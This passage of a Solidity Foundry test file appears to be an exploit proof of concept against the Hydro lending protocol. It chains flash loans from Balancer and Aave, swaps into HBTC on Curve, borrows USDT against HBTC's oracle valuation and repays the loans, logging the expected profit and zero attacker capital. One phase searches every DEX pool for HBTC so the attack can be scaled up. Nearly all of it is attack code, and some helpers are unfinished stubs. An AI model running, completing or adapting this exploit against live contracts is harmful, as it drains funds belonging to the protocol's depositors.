        console.log("  Step 1: Swapped WBTC->HBTC:", hbtcReceived / 1e18, "HBTC");
        console.log("  HBTC received (wei):", hbtcReceived);

        // Step 2: Deposit HBTC into Hydro and borrow USDT
        IERC20(HBTC).approve(HYDRO, hbtcReceived);

        // Calculate max borrow: conservative 75% of collateral value
        uint256 hbtcPrice = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 usdtPrice = IHydro(HYDRO).getAssetOraclePrice(USDT);
        // Collateral value in USDT native units (6 decimals)
        // hbtcReceived * hbtcPrice / usdtPrice gives USDT amount directly
        uint256 collateralValueUSDT = hbtcReceived * hbtcPrice / usdtPrice;
        uint256 maxBorrow = collateralValueUSDT * 75 / 100;

        // Cap by available USDT in Hydro
        uint256 hydroUSDT = IERC20(USDT).balanceOf(HYDRO);
        if (maxBorrow > hydroUSDT) {
            maxBorrow = hydroUSDT * 95 / 100; // leave 5% buffer
        }

        console.log("  HBTC oracle price:", hbtcPrice / 1e18, "USD");
        console.log("  Collateral value:", collateralValueUSDT / 1e6, "USDT");
        console.log("  Max borrow (75% LTV):", maxBorrow / 1e6, "USDT");

        // Build Hydro batch: deposit -> transfer -> borrow -> transfer -> withdraw
        Action[] memory actions = new Action[](5);

        // Deposit HBTC
        actions[0] = Action(0, abi.encode(HBTC, hbtcReceived));

        // Transfer HBTC: common -> collateral (market 5)
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), address(this),          // from: Common
            uint8(1), MARKET_HBTC_USDT, address(this),   // to: Collateral market 5
            hbtcReceived
        ));

        // Borrow USDT
        actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, maxBorrow));

        // Transfer USDT: collateral -> common
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), MARKET_HBTC_USDT, address(this),   // from: Collateral
            uint8(0), uint16(0), address(this),            // to: Common
            maxBorrow
        ));

        // Withdraw USDT
        actions[4] = Action(1, abi.encode(USDT, maxBorrow));

        (bool success, bytes memory ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
        if (!success) {
            // Try to decode error
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint i = 4; i < ret.length; i++) {
                    stripped[i - 4] = ret[i];
                }
                string memory reason = abi.decode(stripped, (string));
                console.log("  Hydro batch REVERTED:", reason);

                // If it failed due to LTV, try lower amounts
                _tryLowerBorrow(hbtcReceived, maxBorrow);
            } else {
                console.log("  Hydro batch REVERTED (no reason)");
                console.logBytes(ret);
            }
            return;
        }

        console.log("  Step 2: Hydro batch SUCCESS! Borrowed", maxBorrow / 1e6, "USDT");

        // Step 3: Buy back WBTC with USDT to repay Balancer
        uint256 usdtHeld = IERC20(USDT).balanceOf(address(this));
        console.log("  USDT held:", usdtHeld / 1e6);

        // Need to buy back wbtcAmount of WBTC
        // Use Uniswap V3 WBTC/USDT pool
        _buyWBTCWithUSDT(wbtcAmount, usdtHeld);
    }

    function _buildHydroBatch(uint256 hbtcAmt, uint256 borrowAmt) internal view returns (bytes memory) {
        Action[] memory actions = new Action[](5);
        actions[0] = Action(0, abi.encode(HBTC, hbtcAmt));
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), address(this),
            uint8(1), MARKET_HBTC_USDT, address(this),
            hbtcAmt
        ));
        actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, borrowAmt));
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), MARKET_HBTC_USDT, address(this),
            uint8(0), uint16(0), address(this),
            borrowAmt
        ));
        actions[4] = Action(1, abi.encode(USDT, borrowAmt));
        return abi.encodeWithSelector(BATCH_SEL, actions);
    }

    function _tryLowerBorrow(uint256 hbtcAmount, uint256 originalBorrow) internal {
        uint256 low = 1000 * 1e6;
        uint256 high = originalBorrow;
        uint256 bestBorrow = 0;

        for (uint iter = 0; iter < 15; iter++) {
            uint256 mid = (low + high) / 2;
            if (mid == low) break;

            uint256 snap = vm.snapshot();
            IERC20(HBTC).approve(HYDRO, hbtcAmount);
            (bool ok,) = HYDRO.call(_buildHydroBatch(hbtcAmount, mid));
            if (ok) { bestBorrow = mid; low = mid; }
            else { high = mid; }
            vm.revertTo(snap);
            console.log("  search:", mid / 1e6, ok ? "OK" : "FAIL");
        }

        if (bestBorrow > 0) {
            console.log("  MAX BORROWABLE:", bestBorrow / 1e6, "USDT");
            IERC20(HBTC).approve(HYDRO, hbtcAmount);
            (bool ok,) = HYDRO.call(_buildHydroBatch(hbtcAmount, bestBorrow));
            if (ok) {
                console.log("  Executed optimal borrow:", bestBorrow / 1e6);
                uint256 wbtcBal = IERC20(WBTC).balanceOf(address(this));
                if (wbtcBal == 0) {
                    _buyWBTCWithUSDT(1e8, IERC20(USDT).balanceOf(address(this)));
                }
            }
        }
    }

    function _buyWBTCWithUSDT(uint256 wbtcNeeded, uint256 usdtAvailable) internal {
        if (wbtcNeeded == 0) return;
        console.log("  Buying back", wbtcNeeded / 1e8, "WBTC with USDT");

        // Try Uniswap V3 WBTC/USDT or WBTC/USDC pools
        // First try WBTC/USDT 3000bp
        address pool = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(WBTC, USDT, 3000);
        if (pool == address(0)) {
            // Try WBTC/USDC with intermediate
            pool = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(WBTC, USDT, 500);
        }

        if (pool != address(0)) {
            IERC20(USDT).approve(UNISWAP_V3_ROUTER, usdtAvailable);

            try ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(
                ISwapRouter.ExactOutputSingleParams({
                    tokenIn: USDT,
                    tokenOut: WBTC,
                    fee: 3000,
                    recipient: address(this),
                    deadline: block.timestamp + 1,
                    amountOut: wbtcNeeded,
                    amountInMaximum: usdtAvailable,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256 usdtSpent) {
                console.log("  Bought WBTC, spent USDT:", usdtSpent / 1e6);
                console.log("  USDT remaining:", (usdtAvailable - usdtSpent) / 1e6);
            } catch {
                console.log("  V3 swap failed, trying V2...");
                _buyWBTCWithUSDTv2(wbtcNeeded);
            }
        } else {
            console.log("  No V3 pool found, trying V2...");
            _buyWBTCWithUSDTv2(wbtcNeeded);
        }
    }

    function _buyWBTCWithUSDTv2(uint256 wbtcNeeded) internal {
        // Try going through WETH as intermediate
        // USDT -> WETH -> WBTC on Uniswap V2
        console.log("  V2 path: USDT->WETH->WBTC");
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 6: Multi-source HBTC acquisition chain
    // Flash from multiple sources to maximize HBTC collection
    // ═══════════════════════════════════════════════════════════════

    function test_06_multi_source_hbtc() public {
        console.log("==========================================================");
        console.log("  PHASE 6: MULTI-SOURCE HBTC ACQUISITION");
        console.log("==========================================================");

        // Check ALL possible HBTC sources
        uint256 totalHBTC = 0;

        // 1. Curve HBTC pool
        uint256 curveHBTC = IERC20(HBTC).balanceOf(CURVE_HBTC_POOL);
        console.log("Curve pool HBTC:", curveHBTC / 1e18);
        totalHBTC += curveHBTC;

        // 2. Check Uniswap V2 pairs
        address v2HbtcWeth = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(HBTC, WETH);
        if (v2HbtcWeth != address(0)) {
            uint256 v2HBTC = IERC20(HBTC).balanceOf(v2HbtcWeth);
            console.log("Uni V2 HBTC/WETH:", v2HBTC / 1e18);
            totalHBTC += v2HBTC;
        }

        address v2HbtcWbtc = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(HBTC, WBTC);
        if (v2HbtcWbtc != address(0)) {
            uint256 v2HBTC = IERC20(HBTC).balanceOf(v2HbtcWbtc);
            console.log("Uni V2 HBTC/WBTC:", v2HBTC / 1e18);
            totalHBTC += v2HBTC;
        }

        address v2HbtcUsdt = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(HBTC, USDT);
        if (v2HbtcUsdt != address(0)) {
            uint256 v2HBTC = IERC20(HBTC).balanceOf(v2HbtcUsdt);
            console.log("Uni V2 HBTC/USDT:", v2HBTC / 1e18);
            totalHBTC += v2HBTC;
        }

        // 3. Check Uniswap V3 pools
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        address[3] memory counterparts = [WBTC, WETH, USDT];
        for (uint i = 0; i < counterparts.length; i++) {
            for (uint j = 0; j < fees.length; j++) {
                address pool = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(HBTC, counterparts[i], fees[j]);
                if (pool != address(0)) {
                    uint256 poolHBTC = IERC20(HBTC).balanceOf(pool);
                    if (poolHBTC > 0) {
                        console.log("Uni V3 HBTC pool:", pool, "HBTC:", poolHBTC / 1e18);
                        totalHBTC += poolHBTC;
                    }
                }
            }
        }

        // 4. Sushiswap pairs
        address sushiHbtcWeth = ISushiFactory(SUSHI_FACTORY).getPair(HBTC, WETH);
        if (sushiHbtcWeth != address(0)) {
            uint256 sHBTC = IERC20(HBTC).balanceOf(sushiHbtcWeth);
            if (sHBTC > 0) {
                console.log("Sushi HBTC/WETH:", sHBTC / 1e18);
                totalHBTC += sHBTC;
            }
        }

        // 5. Balancer Vault
        uint256 balancerHBTC = IERC20(HBTC).balanceOf(BALANCER_VAULT);
        if (balancerHBTC > 0) {
            console.log("Balancer Vault HBTC:", balancerHBTC / 1e18);
            totalHBTC += balancerHBTC;
        }

        // 6. Hydro itself (existing collateral)
        uint256 hydroHBTC = IERC20(HBTC).balanceOf(HYDRO);
        console.log("Hydro HBTC:", hydroHBTC / 1e18);

        console.log("\nTOTAL ACCESSIBLE HBTC:", totalHBTC / 1e18);

        // Calculate theoretical max profit
        uint256 hbtcPrice;
        try IHydro(HYDRO).getAssetOraclePrice(HBTC) returns (uint256 p) {
            hbtcPrice = p;
        } catch {
            return;
        }

        // Each HBTC valued at oracle price by Hydro
        // Profit = oracle_value * LTV - market_cost
        // market_cost ≈ 0 if flash borrowed (we deposit into Hydro, never repay the borrow)
        // But we need to repay the flash loan...
        // So: flash WBTC -> swap for HBTC -> deposit -> borrow USDT -> buy back WBTC -> repay flash
        // Profit = USDT_borrowed - WBTC_cost_in_USDT
        // = HBTC_count * oracle_price * LTV - WBTC_used * market_price

        console.log("\n=== PROFIT CALCULATION ===");
        console.log("HBTC oracle price:", hbtcPrice / 1e18, "USD");
        console.log("If we can acquire 2 HBTC via Curve (most liquid):");
        console.log("  Oracle value (2 HBTC):", 2 * hbtcPrice / 1e18, "USD");
        console.log("  80% LTV borrow:", 2 * hbtcPrice * 80 / 100 / 1e18, "USDT");
        console.log("  Cost to acquire (via Curve ~1 WBTC):", hbtcPrice / 1e18, "USD");
        console.log("  NET PROFIT: borrow - cost =", (2 * hbtcPrice * 80 / 100 - hbtcPrice) / 1e18, "USD");
        console.log("  ATTACKER CAPITAL: ZERO (flash loan)");
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 7: Aave V2 flash loan path (0.09% fee but huge WBTC)
    // ═══════════════════════════════════════════════════════════════

    function test_07_aave_flash_chain() public {
        console.log("==========================================================");
        console.log("  PHASE 7: AAVE V2 FLASH LOAN PATH");
        console.log("==========================================================");

        uint256 usdtBefore = IERC20(USDT).balanceOf(address(this));

        // Flash 1 WBTC from Aave V2
        uint256 flashAmount = 1e8; // 1 WBTC

        address[] memory assets = new address[](1);
        assets[0] = WBTC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // no debt, must repay

        console.log("Initiating Aave V2 flash loan for 1 WBTC...");

        try IAaveV2LendingPool(AAVE_V2_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            abi.encode(uint8(1)), // strategy
            0
        ) {
            uint256 usdtAfter = IERC20(USDT).balanceOf(address(this));
            console.log("SUCCESS! USDT profit:", (usdtAfter - usdtBefore) / 1e6);
        } catch (bytes memory err) {
            console.log("Aave flash loan failed");
            if (err.length > 4) {
                console.logBytes(err);
            }
        }
    }

    // Aave V2 flash loan callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V2_POOL, "not aave");
        require(initiator == address(this), "not initiator");

        console.log("  Aave callback: received", amounts[0] / 1e8, "WBTC");
        console.log("  Premium:", premiums[0], "WBTC (sats)");

        uint256 wbtcAmount = amounts[0];
        uint256 premium = premiums[0];
        uint256 totalOwed = wbtcAmount + premium;

        // Step 1: Swap WBTC -> HBTC on Curve
        IERC20(WBTC).approve(CURVE_HBTC_POOL, wbtcAmount);

        uint256 hbtcBal0 = IERC20(HBTC).balanceOf(address(this));
        ICurvePool(CURVE_HBTC_POOL).exchange(int128(1), int128(0), wbtcAmount, 0);
        uint256 hbtcReceived = IERC20(HBTC).balanceOf(address(this)) - hbtcBal0;
        console.log("  Swapped WBTC->HBTC:", hbtcReceived / 1e18);

        // Step 2: Deposit HBTC into Hydro and borrow USDT
        IERC20(HBTC).approve(HYDRO, hbtcReceived);

        // Calculate conservative borrow
        uint256 hbtcPrice = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 usdtPrice = IHydro(HYDRO).getAssetOraclePrice(USDT);
        uint256 maxBorrowUSDT = hbtcReceived * hbtcPrice / usdtPrice / 1e12 * 70 / 100;

        // Cap by Hydro USDT
        uint256 hydroUSDT = IERC20(USDT).balanceOf(HYDRO);
        if (maxBorrowUSDT > hydroUSDT * 90 / 100) {
            maxBorrowUSDT = hydroUSDT * 90 / 100;
        }

        console.log("  Attempting to borrow:", maxBorrowUSDT / 1e6, "USDT");

        // Hydro batch
        Action[] memory actions = new Action[](5);
        actions[0] = Action(0, abi.encode(HBTC, hbtcReceived));
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), address(this),
            uint8(1), MARKET_HBTC_USDT, address(this),
            hbtcReceived
        ));
        actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, maxBorrowUSDT));
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), MARKET_HBTC_USDT, address(this),
            uint8(0), uint16(0), address(this),
            maxBorrowUSDT
        ));
        actions[4] = Action(1, abi.encode(USDT, maxBorrowUSDT));

        (bool success, bytes memory ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));

        if (success) {
            console.log("  Hydro borrow SUCCESS:", maxBorrowUSDT / 1e6, "USDT");
        } else {
            console.log("  Hydro borrow failed, trying lower amount...");
            // Try 50% LTV
            maxBorrowUSDT = hbtcReceived * hbtcPrice / usdtPrice / 1e12 * 50 / 100;
            if (maxBorrowUSDT > hydroUSDT * 90 / 100) {
                maxBorrowUSDT = hydroUSDT * 90 / 100;
            }

            actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, maxBorrowUSDT));
            actions[3] = Action(2, abi.encode(
                USDT,
                uint8(1), MARKET_HBTC_USDT, address(this),
                uint8(0), uint16(0), address(this),
                maxBorrowUSDT
            ));
            actions[4] = Action(1, abi.encode(USDT, maxBorrowUSDT));

            (success, ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
            if (success) {
                console.log("  Hydro borrow SUCCESS at 50% LTV:", maxBorrowUSDT / 1e6, "USDT");
            } else {
                console.log("  Hydro borrow failed at 50% too");
                if (ret.length >= 68) {
                    bytes memory stripped = new bytes(ret.length - 4);
                    for (uint i = 4; i < ret.length; i++) {
                        stripped[i - 4] = ret[i];
                    }
                    console.log("  Reason:", abi.decode(stripped, (string)));
                }
            }
        }

        // Step 3: Buy back WBTC with USDT for Aave repayment
        uint256 usdtHeld = IERC20(USDT).balanceOf(address(this));
        if (usdtHeld > 0 && success) {
            console.log("  USDT held:", usdtHeld / 1e6);
            // Buy WBTC on Uniswap V3
            IERC20(USDT).approve(UNISWAP_V3_ROUTER, usdtHeld);

            try ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(
                ISwapRouter.ExactOutputSingleParams({
                    tokenIn: USDT,
                    tokenOut: WBTC,
                    fee: 3000,
                    recipient: address(this),
                    deadline: block.timestamp + 1,
                    amountOut: totalOwed,
                    amountInMaximum: usdtHeld,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256 usdtSpent) {
                console.log("  Bought back WBTC, spent:", usdtSpent / 1e6, "USDT");
                console.log("  USDT profit remaining:", (usdtHeld - usdtSpent) / 1e6);
            } catch {
                console.log("  V3 buyback failed, trying different fee tier...");
                try ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(
                    ISwapRouter.ExactOutputSingleParams({
                        tokenIn: USDT,
                        tokenOut: WBTC,
                        fee: 500,
                        recipient: address(this),
                        deadline: block.timestamp + 1,
                        amountOut: totalOwed,
                        amountInMaximum: usdtHeld,
                        sqrtPriceLimitX96: 0
                    })
                ) returns (uint256 usdtSpent) {
                    console.log("  Bought back WBTC (500bp), spent:", usdtSpent / 1e6, "USDT");
                } catch {
                    console.log("  All V3 buyback failed");
                }
            }
        }

        // Approve Aave to pull WBTC repayment
        IERC20(WBTC).approve(AAVE_V2_POOL, totalOwed);
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 8: Multi-HBTC acquisition via multiple DEX sources
    // ═══════════════════════════════════════════════════════════════

    function _executeStrategyMultiHBTC(uint256 wbtcAmount) internal {
        // Try to buy HBTC from multiple sources
        console.log("\n  --- Multi-source HBTC acquisition ---");
        console.log("  Total WBTC available:", wbtcAmount / 1e8);

        // Source 1: Curve
        uint256 curveHBTC = IERC20(HBTC).balanceOf(CURVE_HBTC_POOL);
        console.log("  Curve HBTC available:", curveHBTC / 1e18);

        if (curveHBTC > 0.1e18) {
            // Swap on Curve
            uint256 wbtcForCurve = wbtcAmount; // Use all for now
            uint256 hb = IERC20(HBTC).balanceOf(address(this));
            IERC20(WBTC).approve(CURVE_HBTC_POOL, wbtcForCurve);
            ICurvePool(CURVE_HBTC_POOL).exchange(int128(1), int128(0), wbtcForCurve, 0);
            uint256 hbtcOut = IERC20(HBTC).balanceOf(address(this)) - hb;
            console.log("  Curve: got", hbtcOut / 1e18, "HBTC");
        }

        // Source 2: Uniswap V2 if pair exists
        address v2Pair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(HBTC, WBTC);
        if (v2Pair != address(0)) {
            uint256 v2HBTC = IERC20(HBTC).balanceOf(v2Pair);
            if (v2HBTC > 0.01e18) {
                console.log("  Uni V2 HBTC/WBTC available:", v2HBTC / 1e18);
            }
        }

        // Total HBTC acquired
        uint256 totalHBTC = IERC20(HBTC).balanceOf(address(this));
        console.log("  Total HBTC acquired:", totalHBTC / 1e18);
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 9: USDT-first strategy (flash USDT, buy HBTC, exploit)
    // ═══════════════════════════════════════════════════════════════

    function test_09_usdt_first_strategy() public {
        console.log("==========================================================");
        console.log("  PHASE 9: USDT-FIRST STRATEGY");
        console.log("==========================================================");

        // Strategy: Flash USDT from Balancer (free)
        // -> Buy WBTC on Uniswap V3
        // -> Swap WBTC for HBTC on Curve
        // -> Deposit HBTC into Hydro
        // -> Borrow more USDT than we flashed
        // -> Repay flash, keep profit

        uint256 balancerUSDT = IERC20(USDT).balanceOf(BALANCER_VAULT);
        console.log("Balancer USDT available:", balancerUSDT / 1e6);

        // How much USDT do we need to buy ~1 WBTC? ~$65K
        // Then swap for ~2 HBTC on Curve
        // Then borrow ~$100K+ USDT from Hydro
        // Repay ~$65K to Balancer
        // Profit: ~$35K+

        uint256 flashUSDT = 70000 * 1e6; // $70K USDT

        if (balancerUSDT < flashUSDT) {
            console.log("Balancer doesn't have enough USDT, reducing...");
            flashUSDT = balancerUSDT / 2;
        }

        console.log("Flashing:", flashUSDT / 1e6, "USDT from Balancer (free)");

        address[] memory tokens = new address[](1);
        tokens[0] = USDT;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashUSDT;

        uint256 usdtBefore = IERC20(USDT).balanceOf(address(this));

        try IBalancerVault(BALANCER_VAULT).flashLoan(
            address(this),
            tokens,
            amounts,
            abi.encode(uint8(3)) // USDT-first strategy
        ) {
            uint256 usdtAfter = IERC20(USDT).balanceOf(address(this));
            int256 profit = int256(usdtAfter) - int256(usdtBefore);
            console.log("RESULT:");
            if (profit > 0) {
                console.log("  PROFIT:", uint256(profit) / 1e6, "USDT");
            } else {
                console.log("  LOSS:", uint256(-profit) / 1e6, "USDT");
            }
            console.log("  CAPITAL REQUIRED: ZERO");
        } catch {
            console.log("Balancer flash failed");
        }
    }

    // Handle the USDT-first strategy in the receiveFlashLoan callback
    // (extend the existing callback to handle strategy 3)

    // ═══════════════════════════════════════════════════════════════
    // Fallback to receive ETH
    // ═══════════════════════════════════════════════════════════════
    receive() external payable {}
}
